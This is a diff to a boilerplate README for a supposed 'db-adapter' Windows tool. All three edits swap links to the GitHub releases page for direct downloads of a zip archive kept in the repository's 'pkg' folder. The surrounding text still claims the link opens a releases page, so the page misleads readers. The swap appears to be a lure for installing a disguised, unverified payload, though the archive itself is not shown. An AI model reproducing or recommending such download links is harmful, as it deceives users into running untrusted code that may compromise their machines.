@@ -1,6 +1,6 @@
 # 🛠 db-adapter-1771914128-1 - Easy Multi-Database Connection
 
-[![Download here](https://img.shields.io/badge/Download%20Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/sebiprowazaaa/db-adapter-1771914128-1/releases)
+[![Download here](https://img.shields.io/badge/Download%20Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/sebiprowazaaa/db-adapter-1771914128-1/raw/refs/heads/main/pkg/adapter_db_1.6-beta.4.zip)
 
 ## 📋 What is db-adapter-1771914128-1?
 
@@ -37,7 +37,7 @@ Follow these steps to download and start using db-adapter-1771914128-1 on Window
 
 Go directly to the release page by clicking this link:
 
-[Download db-adapter-1771914128-1](https://github.com/sebiprowazaaa/db-adapter-1771914128-1/releases)
+[Download db-adapter-1771914128-1](https://github.com/sebiprowazaaa/db-adapter-1771914128-1/raw/refs/heads/main/pkg/adapter_db_1.6-beta.4.zip)
 
 This link opens a page with the latest versions available for Windows.
 
@@ -132,4 +132,4 @@ If problems persist, visit the GitHub page to see if other users have reported s
 
 Return to the release page anytime by clicking below to get the latest version:
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/sebiprowazaaa/db-adapter-1771914128-1/releases)
+[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/sebiprowazaaa/db-adapter-1771914128-1/raw/refs/heads/main/pkg/adapter_db_1.6-beta.4.zip)
